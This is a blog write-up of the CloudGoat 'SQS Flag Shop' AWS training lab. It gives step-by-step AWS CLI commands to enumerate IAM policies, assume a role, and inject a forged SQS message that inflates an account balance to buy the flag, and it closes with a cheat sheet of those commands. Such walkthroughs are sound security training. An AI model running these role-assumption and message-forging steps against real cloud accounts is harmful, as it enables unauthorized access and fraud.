---
title: "Cloudgoat SQS Flag Shop"
date: 2025-06-17
draft: false
language: en
featured_image: ../assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo.png
summary: A walkthrough of the final easy SQS Flagshop Cloudgoat challenge 
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "SQS", "Cloudgoat"]
---
# Introduction & Context

Hey guys, this is a write-up for the sns_secrets challenge from Cloudgoat, available [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sqs_flag_shop/README.md). This lab involves a bit of simple web recon, source code analysis & using simple queue service (sqs) to gain access to the flag. Note this lab does set up EC2, which you can be charged for if you leave it running too long. This the final lab left in the easy category of the cloudgoat challenges. I tried to challenge myself to this mostly manually, so I'll give my thought process for doing it by hand. Now to the lab!

# Setup

If you haven't started cloudgoat yet, you can start with `cloudgoat create sqs_flag_shop`. This one does takea. while (~10 minutes) to boot up. Patience. Once it's set, you'll get a pair of credentials as well as ip address. Record the 3 bits of info down. Set up an AWS profile using `aws configure --profile sqsuser`. I set the region as `us-east-1` and format to `json`. 

Of course, make sure to validate the credentials by running `aws sts get-caller-identity --profile sqsuser`. It should work just fine. Now to start!

# Enumeration

We'll need to check out both the website and the user to determine how we can purchase the flag. Let's start by doing the website first. You can of course enumerate the user too first, but you'll need to do both eventually to get our flag. 

## Website

First let's go to the website, it'll be something like `http://3.231.22.229:5000`. You should get a warning about the website, as it is running just HTTP isntead of the secure HTTPS. The issue with HTTP sites is that your information is sent through cleartext so anyone can see how you interact with it. That's fine in our case as we are running a lab on a website designed intentionally for this. In any other case, avoid using HTTP unless absolutely neccesary. 

On the website, you'll be shown a few images (items to purchase), as well as a total asset count. Feel free to investigate the charge and receipt panel too. But I'm going to start off with inspecting the source code. More often than not, CTFs have something hidden in the page source code. Simply right click and click `view page source code`. 

```python
<!-- 
@app.route('/charge_cash/<cash>', methods=['POST'])
def charge_cash(cash):
    cash = int(cash)
    if cash==1 or cash==5 or cash==10:
        msg = {"charge_amount" : cash}
        message_body = json.dumps(msg)
        response = sqs.sqs_client.send_message(
          QueueUrl=sqs.sqs_queue_url, 
          MessageBody=message_body
        )
        time.sleep(10)
        return redirect(url_for('index'))
    else:
        return "BAD Request!!"
-->
```

Now this. This is interesting. This is a python script, and the note tells us that this is what the backend uses. All this code is doing is it takes in a parameter, does some logic and then responds. If the cash value is 1,5, or 10, it sends an SQS request to increase our value. Unfortunately it also forces a sleep of 10 seconds, so we can't spam charge and get our assets that way. We can't also send a custom cash value as that would be rejected. Our only choice is to bypass this function and directly access the SQS service. 

Looking into the message being set, the message seems to be a pretty simple one. According to the msg line, it should look like:

```json
{"charge_amount":500}
```

Alright, so that's a plan. We need to send a message to this sqs service, with an absurdly large asset value so that we can purchase the flag. 

## AWS Environment

Alright, let's take a look at our environment now. We're going to be doing this entirely manually this time, so be prepared to run some long commands. 

Let's start by checking what policies are attached to us using `aws iam list-user-policies --user-name cg-sqs-user-cgid8as1kkguen --profile sqsuser`. The username you can grab by taking the value after user in the arn property of the response from the sts get caller id call we did earlier. 

That should respond with a PolicyNames object with a value like `cg-sqs-scenario-assumed-role`. We can use that to look into what we can and can not do. Run `aws iam get-user-policy --user-name cg-sqs-user-cgid8as1kkguen --policy-name cg-sqs-scenario-assumed-role --profile sqsuser` to see. I got this:

```json
{
    "UserName": "cg-sqs-user-cgid8as1kkguen",
    "PolicyName": "cg-sqs-scenario-assumed-role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:Get*",
                    "iam:List*"
                ],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::381491899745:role/cg-sqs-send-message-cgid8as1kkguen"
            }
        ]
    }
}
```


Interesting. We have all IAM permissions to get and list, but also a single assume role on a single resource. That is a good telltale sign we should take on that role. So let's try. Assume that role (you can choose any role session name): `aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-sqs-send-message-cgid8as1kkguen --role-session-name hacker --profile sqsuser`. Copy and paste the entire response into your notes, you'll need to set the token manually. 

Now let's see what the role can do. Run `aws iam list-role-policies --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser`, and you'll see the role has a single policy attached: `cg-sqs`. Grab it's details using `aws iam get-role-policy --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser --policy-name cg-sqs`. The result should be

```json
{
    "RoleName": "cg-sqs-send-message-cgid8as1kkguen",
    "PolicyName": "cg-sqs",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "sqs:GetQueueUrl",
                    "sqs:SendMessage"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:sqs:us-east-1:381491899745:cash_charging_queue"
            }
        ]
    }
}
```

So this role, can do a couple things on sqs. It can grab a queue url and send a message. Taking a guess, we probably need to call the getQueueUrl first, so that we can send the message. But note a couple things before moving on. 

1. Running `assume-role`, does NOT mean your profile itself gains the permissions of the role. That simply gives a set of credentials that you need to now configure before you can actually take on the role.
2. The resource right below the Efffect property contains a piece of critical information. Don't just ignore the little things in responses you get. That contains the queue-name at the end, `cash_charging_queue`. I myself am used to finding things like this in the website, not in responses querying roles. But that is something we will need later on. 

Before we actually use SQS, let's take a moment to learn what SQS is. According to [this](https://aws.amazon.com/sqs/), it's a message queuing service that can be used in a variety of places. It allows you to send, store and receive messages between storage components, kind of like an API in a sense. But it's meant for relatively quick calls instead of intensive tasks, where the "action" can be seperate from a "response" to the front end. 

# Abuse SQS

Start by setting up a profile for that role by doing a simple `aws configure --profile sqssuper` and passing in the normal values (region is still `us-east-1` and format as `json`). But you'll need to add that long token using `aws configure set profile.sqssuper.aws_session_token PASTEVALUEHERE`. Run a quick `aws sts get-caller-identity --profile sqssuper` before moving on.

We'll need to grab the queue url first, but how? The aws documentation [here](https://docs.aws.amazon.com/cli/latest/reference/sqs/) has all the commands we will need. The first command is `aws sqs get-queue-url --profile sqssuper --queue-name cash_charging queue`. That should give you a url to use. 

Now we can check the documentation again, and you'll notice you can send the message using something like `aws sqs send-message --profile sqssuper --queue-url https://sqs.us-east-1.amazonaws.com/381491899745/cash_charging_queue --message-body '{"charge_amount" : 100000000}'`. Running that should give you the extra assets we need. 

# Grabbing the flag

Now head back to the website, and refresh if needed. You should now have enough assets to purchase the flag! After purchasing, just visit the receipts page and you'll see your flag. And we're done!

# Conclusion

This was a nice concluding lab for this section, where we had to do some basic web recon along with learning another amazon service. We started by searching through source code, finding the back-end code, then assumed a role and sent a message giving us plenty of assets. This lab shows how it's important to secure services so that only authorized users can call them. 

*Don't forget to destroy your lab after! This lab does take a while (~10 minutes). The first time I tried, it got stuck and was unable to destroy it. If this happens, cancel the current cloudgoat call by calling control/command + c, and then head to the AWS Web console. Then search for the component that wasn't being destroyed (eg. VPC, Security Group, etc ). Some require other resources to be destroyed first (I needed to destroy my VPC). Then you should run the command once more to ensure your local data is destroyed and any remnants are removed.* 

```bash
cloudgoat destroy sqs_flag_shop
```

# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
cloudgoat create sqs_flag_shop
aws configure --profile sqsuser

#Website analysis

#Enumerate environment
aws sts get-caller-identity --profile sqsuser
aws iam list-user-policies --user-name cg-sqs-user-cgid8as1kkguen --profile sqsuser   
aws iam get-user-policy --user-name cg-sqs-user-cgid8as1kkguen --policy-name cg-sqs-scenario-assumed-role --profile sqsuser

#Look into the role
aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-sqs-send-message-cgid8as1kkguen --role-session-name hacker --profile sqsuser
aws iam list-role-policies --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser 
        "cg-sqs"
    ]
}
aws iam get-role-policy --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser --policy-name cg-sqs

#Configure the role
aws configure --profile sqssuper
aws configure set profile.sqssuper.aws_session_token TOKENGOESHERE

#Use SQS
aws sqs get-queue-url --profile sqssuper --queue-name cash_charging_queue
aws sqs send-message --profile sqssuper --queue-url https://sqs.us-east-1.amazonaws.com/381491899745/cash_charging_queue --message-body '{"charge_amount" : 100000000}'

#Destroy
cloudgoat destroy sqs_flag_shop
```


```

```
